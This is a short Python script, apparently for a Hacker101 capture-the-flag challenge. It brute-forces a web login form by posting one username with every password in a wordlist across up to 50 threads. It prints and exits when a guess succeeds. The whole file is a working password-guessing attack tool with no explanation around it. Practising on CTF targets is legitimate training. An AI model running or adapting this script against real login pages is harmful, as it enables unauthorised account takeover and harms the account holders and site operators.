import requests
from time import sleep
import threading
import os
import sys

def check_username(username, password, url):
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if "Invalid password" not in response.text:
        print(f"Username: {username}, Password: {password}")
        print(response.text)
        os._exit(1)
    else:
        print(f"Incorrect password: {password}")

username = sys.argv[1]
threads = []
url = "https://{id}.ctf.hacker101.com/login"
username_file = open("lists/names.txt", "r")
for name in username_file.readlines():
    if threading.active_count() > 50:
        sleep(1)
    threading.Thread(target=check_username, args=(username, name.strip(), url)).start()
    sleep(0.01)
